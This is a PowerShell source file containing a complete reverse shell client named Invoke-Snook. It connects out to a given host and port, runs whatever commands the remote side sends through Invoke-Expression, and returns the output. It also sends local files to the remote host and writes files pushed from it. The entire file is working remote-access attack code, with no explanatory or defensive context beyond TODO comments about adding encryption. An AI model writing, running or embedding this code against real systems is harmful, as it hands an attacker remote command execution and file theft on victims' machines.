# TODO: Implement encryption
# TODO: Implement interactive mode


function Invoke-Snook
{
    [CmdletBinding()] Param(
        [Parameter(Mandatory=$true, Position=0)]
        [String]
        $Hostname,

        [Parameter(Mandatory=$true, Position=1)]
        [Int]
        $Port
    )


    function DictToBytes() {
        Param(
            [Parameter(Mandatory=$true, Position=1)]
            [HashTable]
            $Dict
        )

        $message = $Dict | ConvertTo-JSON
        return (New-Object System.Text.ASCIIEncoding).GetBytes($message)
    }


    function FromBase64 {
        Param(
            [Parameter(Mandatory=$true, Position=0)]
            [String]
            $Str,

            [Parameter(Mandatory=$true, Position=1)]
            [System.Text.Encoding]
            $Encoding
        )
        return $Encoding.GetString([Convert]::FromBase64String($Str))
    }


    function GetPrompt {
        'PS ' + (Get-Location).Path + '>'
    }


    function ReceiveData {
        Param(
            [Parameter(Mandatory=$true, Position=0)]
            [System.Net.Sockets.NetworkStream]
            $Stream,

            [Parameter(Mandatory=$true, Position=1)]
            [Int]
            $Size
        )

        $buffer = New-Object System.Byte[] $Size
        $totalBytesRead = 0
        while ($totalBytesRead -lt $Size) {
            $bytesRead = $tcpStream.Read($buffer, $totalBytesRead, $Size - $totalBytesRead)
            if ($bytesRead -eq 0) {
                return $null
            }
            $totalBytesRead += $bytesRead
        }
        return $buffer
    }


    function ReceivePacket {
        Param(
            [Parameter(Mandatory=$true, Position=0)]
            [System.Net.Sockets.NetworkStream]
            $Stream
        )

        $size_bytes = (ReceiveData $Stream 4)
        if ($size_bytes -eq $null) {
            return $null
        }

        [Array]::Reverse($size_bytes)
        $size = [BitConverter]::ToInt32($size_bytes, 0)

        $bytes = (ReceiveData $Stream $size)
        return $bytes
    }


    function SendPacket {
        Param(
            [Parameter(Mandatory=$true, Position=0)]
            [System.Net.Sockets.NetworkStream]
            $Stream,

            [Parameter(Mandatory=$true, Position=1)]
            [Byte[]]
            $Data
        )

        $size = [BitConverter]::GetBytes($Data.Length)
        [Array]::Reverse($size)
        $Stream.Write($size, 0, $size.Length)
        $Stream.Write($Data, 0, $Data.Length)
        $Stream.Flush()
    }


    function ToBase64 {
        Param(
            [Parameter(Mandatory=$true, Position=0)]
            [PSObject]
            $InputObj,

            [Parameter(Mandatory=$true, Position=1)]
            [System.Text.Encoding]
            $Encoding
        )
        $str = ($InputObj | Out-String)
        $str = $str.SubString(0, $str.Length - 2)  # Remove last line break
        return [Convert]::ToBase64String($Encoding.GetBytes($str)) 
    }


    $tcpConnection = New-Object System.Net.Sockets.TcpClient($Hostname, $Port)

    $tcpStream = $tcpConnection.GetStream()
    $encoding = New-Object System.Text.UTF8Encoding

    $prompt = ToBase64 (GetPrompt) $encoding
    $message = @{}
    $message.Add('action', 'hello')
    $arg = @{}
    $arg.Add('features', @('download', 'upload'))
    $encryption = @{}
    $encryption.Add('supported', $false)
    $encryption.Add('enabled', $false)
    $arg.Add('encryption', $encryption)
    $message.Add('args', $arg)
    $message.Add('prompt', $prompt)
    SendPacket $tcpStream (DictToBytes $message)

    $buffer = New-Object System.Byte[] 4096

    while ($tcpConnection.Connected) {
        $packet = (ReceivePacket $tcpStream)
        if ($packet -eq $null) {
            break
        }
        $packet = (New-Object System.Text.ASCIIEncoding).GetString($packet)
        $packet = $packet | ConvertFrom-JSON
        
        if ($packet.action -eq 'cmd') {        
            $command = FromBase64 $packet.args.cmd $encoding
            $out = Invoke-Expression -Command $command -WarningVariable warn `
                                     -ErrorVariable err 2>$null 3>$null

            $response = @{}
            $response.Add('action', $packet.action)
            if ($out) { $response.Add('message', (ToBase64 $out $encoding)) }
            if ($warn) { $response.Add('warning', (ToBase64 $warn[0] $encoding)) }
            if ($err) { $response.Add('error', (ToBase64 $err[0] $encoding)) }
            $response.Add('prompt', (ToBase64 (GetPrompt) $encoding))

            SendPacket $tcpStream (DictToBytes $response)
        } elseif ($packet.action -eq 'download') {
            $response = @{}
            $response.Add('action', $packet.action)
            $path = FromBase64 $packet.args.path $encoding

            if (![System.IO.Path]::IsPathRooted($path)) {
                $path = Join-Path -Path (Get-Location).Path -ChildPath $path
            }

            try {
                $reader =  [System.IO.File]::OpenRead($path)
            } catch {
                $err = ToBase64 $error[0] $encoding
                $response.Add('error', $err)
            }

            if (!$response.ContainsKey('error')) {
                $arguments = @{}
                $arguments.Add('size', $reader.Length)
                $response.Add('args', $arguments)
            }
            
            SendPacket $tcpStream (DictToBytes $response)

            if ($response.ContainsKey('error')) {
                continue
            }

            while (($readBytes = $reader.Read($buffer, 0, $buffer.Length)) -ne 0) {
                SendPacket $tcpStream $buffer[0..($readBytes - 1)]
            }
            $reader.Close()
        } elseif ($packet.action -eq 'upload') {
            $response = @{}
            $response.Add('action', $packet.action)
            $dest = FromBase64 $packet.args.dest $encoding

            try {
                if (![System.IO.Path]::IsPathRooted($dest)) {
                    $dest = Join-Path -Path (Get-Location).Path -ChildPath $dest
                }                

                if ((Get-Item $dest -ErrorAction SilentlyContinue) -is [System.IO.DirectoryInfo]) {
                    $filePath = Join-Path -Path $dest -ChildPath $packet.args.filename
                } else {
                    $filePath = $dest
                }
                
                $writer = [System.IO.File]::OpenWrite($filePath)
            } catch {
                $err = ToBase64 $error[0] $encoding
                $response.Add('error', $err)
            }

            SendPacket $tcpStream (DictToBytes $response)

            if ($response.ContainsKey('error')) {
                continue
            }

            $bytesCount = 0
            $err = $false
            while ($bytesCount -ne $packet.args.size) { 
                $data = (ReceivePacket $tcpStream)
                if ($data -eq $null) {
                    $err = $true
                    break
                }
                $writer.Write($data, 0, $data.Length)
                $bytesCount += $data.Length
            }

            $writer.Close()

            if ($err) {
                break
            }

            $response = @{}
            $response.Add('action', $packet.action)
            $response.Add('message', (ToBase64 (Resolve-Path -Path $filePath).Path $encoding))
            SendPacket $tcpStream (DictToBytes $response)
        }
    }
    $tcpConnection.Close()
}